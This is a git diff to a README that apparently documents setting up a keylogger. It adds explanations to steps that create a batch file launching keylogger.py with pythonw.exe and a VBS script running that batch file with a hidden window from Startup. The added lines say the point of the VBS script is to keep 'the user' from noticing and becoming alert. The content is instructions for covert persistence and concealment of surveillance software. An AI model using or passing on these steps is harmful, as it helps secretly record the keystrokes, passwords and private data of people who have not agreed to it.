@@ -50,6 +50,8 @@ pythonw.exe "C:\path\to\your\keylogger.py"
 ```
 Save as ```logger.bat```
 
+Why? Whenever the user logs in cmd prompt will come up on screen and the program will start running
+
 ### Create a vbs script file
 
 Copy the below snippet and make changes as said
@@ -60,6 +62,8 @@ WshShell.Run "C:\path\to\your\keylogger.bat", 0, False
 
 ```
 Save as ```logger.vbs```
+
+Why? If the user sees the cmd prompt up opening he will be on alert so this file is to make it physically invisible from the screen
 
 ### Add it to Startup apps 
 
